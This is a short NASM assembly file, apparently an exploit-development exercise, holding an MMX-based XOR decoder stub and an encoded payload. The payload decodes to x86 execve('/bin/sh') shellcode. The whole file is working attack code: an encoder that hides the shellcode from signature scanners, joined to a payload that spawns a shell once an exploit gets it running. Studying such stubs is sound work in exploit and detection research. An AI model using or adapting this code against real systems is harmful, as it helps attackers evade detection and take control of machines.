; filename: xor-mmx-decoder.nasm
; author: lawly
; description: stub for decoding xor'ed shellcode using mmx registers

section .text

global _start
_start:
    jmp short call_decoder

decoder:
    pop edi                 ; pointing to 0xaa..
    lea esi, [edi+8]        ; pointing to shellcode

    xor ecx, ecx
    mov cl, 4               ; exceeding bytes will not be interpreted because of execve

    movq mm0, qword [edi]

decode:
    movq mm1, qword [esi]   ; move 8 bytes of shellcode into mm1
    pxor mm1, mm0           ; xor with 0xaa..
    movq [esi], mm1         ; move xor'ed bytes back into position
    add esi, 0x8            ; move forward 8 bytes
    loop decode
    jmp short shellcode

call_decoder:
    call decoder
    decoder_value:  db 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa
    shellcode:      db 0x9b,0x6a,0xfa,0xc2,0xc4,0x85,0xd9,0xc2,0xc2,0x85,0x85,0xc8,0xc3,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a